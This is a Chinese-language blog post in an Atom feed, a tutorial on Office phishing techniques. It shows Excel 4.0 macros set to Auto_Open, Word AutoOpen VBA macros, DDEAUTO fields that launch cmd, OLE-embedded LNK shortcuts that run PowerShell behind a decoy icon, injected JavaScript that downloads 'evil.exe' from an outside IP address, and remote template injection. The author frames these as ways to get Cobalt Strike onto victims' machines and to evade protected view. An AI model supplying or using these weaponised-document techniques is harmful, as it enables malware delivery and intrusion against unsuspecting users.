<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ConsT27&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-02-19T07:59:44.006Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>ConsT27</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://example.com/2021/02/19/office%E9%92%93%E9%B1%BC/"/>
    <id>http://example.com/2021/02/19/office%E9%92%93%E9%B1%BC/</id>
    <published>2021-02-19T07:59:56.265Z</published>
    <updated>2021-02-19T07:59:44.006Z</updated>
    
    <content type="html"><![CDATA[<p>title:office钓鱼</p><h2 id="Office安全保护机制"><a href="#Office安全保护机制" class="headerlink" title="Office安全保护机制"></a>Office安全保护机制</h2><h3 id="受保护的视图"><a href="#受保护的视图" class="headerlink" title="受保护的视图"></a>受保护的视图</h3><p>为了保护计算机不受office病毒侵害，微软设计了一个收保护视图，将所有可疑的office文件以只读方式打开，在该模式下多数编辑功能被禁用。文件呗以受保护视图打开的情况有如下几种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">文件是从 Internet 位置打开的 </span><br><span class="line">文件是通过 Outlook 附件的方式接收的，并且计算机策略将发件人定义为不安全 </span><br><span class="line">文件是从不安全的位置打开的</span><br><span class="line">文件被文件块阻止</span><br><span class="line">文件验证失败</span><br><span class="line">文件是使用“在受保护的视图中打开”选项打开的 </span><br><span class="line">文件是从其他人的 OneDrive 存储中打开的</span><br></pre></td></tr></table></figure><h2 id="XLM-Macro-4-0-（excel宏钓鱼）"><a href="#XLM-Macro-4-0-（excel宏钓鱼）" class="headerlink" title="XLM / Macro 4.0 （excel宏钓鱼）"></a>XLM / Macro 4.0 （excel宏钓鱼）</h2><p>excel下有宏功能，可以用来执行命令。<br>其使用方法如下</p><p>右键下方sheet1，选择插入</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150535.png" alt="QQ截图20210217150535"></p><p>点击 MS Excel4.0宏表，就可在excel中插入一个宏表<br>依次输入这两个命令，并把第一行设置为Auto_Open</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150535.png"></p><p>随后保存为xlsm文件即可。随后当该文件被打开时，会自动打开cmd窗口</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150614.png" alt="QQ截图20210217150614"></p><p>这里的exec其实是执行的cmd命令，我们可以借此来上线cs等操作。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150630.png" alt="QQ截图20210217150630"></p><p>真不错。但在某些情况下打开此类excel文件需手动点击启用宏才能正常钓鱼。</p><h2 id="Word宏"><a href="#Word宏" class="headerlink" title="Word宏"></a>Word宏</h2><p>新建一个word文件，进入宏选项（如果没有请自行在开发者工具里开启</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150658.png" alt="QQ截图20210217150658"></p><p>然后随便输AutoOpen(文件打开时自动执行宏)，创建，注意宏的位置要指定为当前文档</p><p>然后进入宏编辑框</p><p>输入以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">Shell (&quot;calc&quot;)  &#x2F;&#x2F;只需要写这个就行了</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>AutoExec：启动 Word 或加载全局模板时<br>AutoNew：每次新建文档时<br>AutoOpen：每次打开已有文档时<br>AutoClose：每次关闭文档时<br>AutoExit：退出 Word 或卸载全局模板时</p><p>保存为docm（启用宏的word文档）</p><p>打开文件，就蹦出计算器了。（前提是在信任中心设置开启所有宏）<br>当然，一般情况下打开此类文件会显示</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150708.png" alt="QQ截图20210217150708"></p><p>启用内容后就会弹计算器了</p><h2 id="Word-DDE"><a href="#Word-DDE" class="headerlink" title="Word DDE"></a>Word DDE</h2><p>在word文件里，输入 ctrl+F9,进入到域代码编辑。我们可以键入以下代码使文件在被打开时执行系统命令（word2019复现未成功，word2016成功，似乎是word版本问题<br>这个蛮实用的，目前众多word是默认禁用宏的，dde只需要用户点击两个按钮即可执行，实用性比宏好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;&#x2F;k calc.exe&quot; </span><br></pre></td></tr></table></figure><p>随后在打开该文件时会出现两个对话框，全点是就会执行以上命令了</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150729.png" alt="QQ截图20210217150729"></p><h2 id="office-OLE-LNK"><a href="#office-OLE-LNK" class="headerlink" title="office OLE+LNK"></a>office OLE+LNK</h2><p>核心目标是创建一个内嵌的lnk文件诱导用户点击，从而执行命令。word，excel都能使用</p><p>我们创建一个快捷方式如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150802.png" alt="QQ截图20210217150802"></p><p>其目标处填写的是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe -command calc</span><br></pre></td></tr></table></figure><p>然后打开word文件，插入对象，选择package，为了更加逼真勾选显示为图标，然后可以更改图标，我们在更改图标处选择一个迷惑性比较大的图标</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150813.png" alt="QQ截图20210217150813"></p><p>然后进入创建软件包界面，选择我们刚刚创建的lnk文件，写好卷标名，然后就把软件包插入到word界面了，只要用户点击该软件包并选择执行，则会执行我们在lnk中定义的代码</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150822.png" alt="QQ截图20210217150822"></p><p>而且值得一提的是，如果用上述方法把lnk文件放入publisher文件，则在网络中打开该文件时不会触发受保护视图。（可能是我本地环境有点错？我觉得这个有点离谱</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150831.png" alt="QQ截图20210217150831"></p><h2 id="嵌入js元素"><a href="#嵌入js元素" class="headerlink" title="嵌入js元素"></a>嵌入js元素</h2><p>这个说实话需要一点js功底。。<br>这个方式的原理是，如果我们往word中插入联机视频，那么再word的压缩包 word/document.xml里的embeddedHtml项中会出现联机视频对应的内嵌html代码，我们可以通过修改这些代码，插入恶意js代码。</p><p>一般的利用方式是通过js下载恶意文件，但是似乎是因为word的一些保护机制，不能实现页面跳转或者自动点击下载等操作(打开word文件会报错),好迷</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">                var a &#x3D; document.createElement(&#39;a&#39;);</span><br><span class="line">                console.log(a);</span><br><span class="line">                document.body.appendChild(a);</span><br><span class="line">                a.style &#x3D; &#39;display: none&#39;;</span><br><span class="line">                a.href &#x3D; &quot;http:&#x2F;&#x2F;149.129.64.180&#x2F;evil.exe&quot;;  &#x2F;&#x2F;该行若存在，打开word文件会报错</span><br><span class="line">                a.download &#x3D; fileName;</span><br><span class="line">                window.URL.revokeObjectURL(url);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">                a.click();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>我看了一个POC，里面是通过构造二进制数据交给BLOB对象处理，并自动点击由BLOB对象生成的url实现下载二进制数据，而这些二进制数据实质上是恶意文件。</p><p>因为我搞不来那个二进制数据怎么产生，所以这个方法暂时只做了解吧。。<br>而且我看的那个文章的POC在我的word2016里不能正常工作，不知道是什么原因<br>reference:<a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-replacing-embedded-video-with-bogus-payload">https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-replacing-embedded-video-with-bogus-payload</a></p><h2 id="利用模板文件注入宏指令"><a href="#利用模板文件注入宏指令" class="headerlink" title="利用模板文件注入宏指令"></a>利用模板文件注入宏指令</h2><p>原理是，先创建一个带模板的文档，再创一个启用宏的模板文件。然后在带模板的文档的压缩包里面修改一些内容，使其指向的模板修改为我们自己创建的模板文件，这之间的过程可以由smb协议完成，故过查杀几率较高。</p><p>我们在启用宏的模板文件（doc3.dotm)里写入宏。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">Shell &quot;calc&quot;</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150913.png" alt="QQ截图20210217150913"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title:office钓鱼&lt;/p&gt;
&lt;h2 id=&quot;Office安全保护机制&quot;&gt;&lt;a href=&quot;#Office安全保护机制&quot; class=&quot;headerlink&quot; title=&quot;Office安全保护机制&quot;&gt;&lt;/a&gt;Office安全保护机制&lt;/h2&gt;&lt;h3 id=&quot;受保护</summary>
      
    
    
    
    
  </entry>
  
</feed>
